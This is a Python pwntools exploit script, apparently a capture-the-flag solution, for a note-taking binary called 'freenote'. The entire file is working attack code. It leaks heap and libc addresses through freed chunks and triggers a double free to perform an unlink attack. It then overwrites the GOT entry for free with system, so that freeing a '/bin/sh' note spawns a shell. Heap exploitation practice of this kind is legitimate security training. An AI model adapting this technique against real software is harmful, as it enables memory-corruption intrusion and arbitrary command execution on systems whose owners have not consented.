#!/usr/bin/env python

from pwn import *

io = process(['./freenote'], env={'LD_PRELOAD':'./libc-2.19.so'})
elf = ELF('freenote')
libc = ELF('libc-2.19.so')

def newnote(x):
    io.recvuntil("Your choice: ")
    io.sendline("2")
    io.recvuntil("Length of new note: ")
    io.sendline(str(len(x)))
    io.recvuntil("Enter your note: ")
    io.send(x)

def delnote(x):
    io.recvuntil("Your choice: ")
    io.sendline("4")
    io.recvuntil("Note number: ")
    io.sendline(str(x))

def listnote(x):
    io.recvuntil("Your choice: ")
    io.sendline("1")
    io.recvuntil("%d. " % x)
    return io.recvline(keepends=False)

def editnote(x, s):
    io.recvuntil("Your choice: ")
    io.sendline("3")
    io.recvuntil("Note number: ")
    io.sendline(str(x))
    io.recvuntil("Length of note: ")
    io.sendline(str(len(s)))
    io.recvuntil("Enter your note: ")
    io.send(s)

def leak_base():
    global heap_base
    global libc_base

    for i in range(4):
        newnote("A"*8)

    delnote(0)
    delnote(2)

    newnote("A"*8)  # note 0

    s = listnote(0)[8:]
    heap_addr = u64((s.ljust(8, "\x00"))[:8])
    heap_base = heap_addr - 0x1940      # 0x1940 = 0x1820 + 0x90*2
    log.info("heap base: 0x%x" % heap_base)

    newnote("A"*8)  # note 2

    s = listnote(2)[8:]
    libc_addr = u64((s.ljust(8, "\x00"))[:8])
    libc_base = libc_addr - (libc.symbols['__malloc_hook'] + 0x78)   # 0x78 = libc_addr - __malloc_hook_addr
    log.info("libc base: 0x%x" % libc_base)

    for i in range(4):
        delnote(i)

def unlink():
    newnote(p64(0) + p64(0) + p64(heap_base + 0x18) + p64(heap_base + 0x20))    # note 0
    newnote('/bin/sh\x00')  # note 1
    newnote("A"*128 + p64(0x1a0)+p64(0x90)+"A"*128 + p64(0)+p64(0x21)+"A"*24 + "\x01")   # note 2
    delnote(3)  # double free

def overwrite_note():
    system_addr = libc_base + libc.symbols['system']
    log.info("system address: 0x%x" % system_addr)

    editnote(0, p64(2) + p64(1)+p64(8)+p64(elf.got['free']))    # Note.content = free_got
    editnote(0, p64(system_addr))   # free => system

def pwn():
    delnote(1)  # system('/bin/sh')
    io.interactive()

if __name__ == "__main__":
    leak_base()
    unlink()
    overwrite_note()
    pwn()
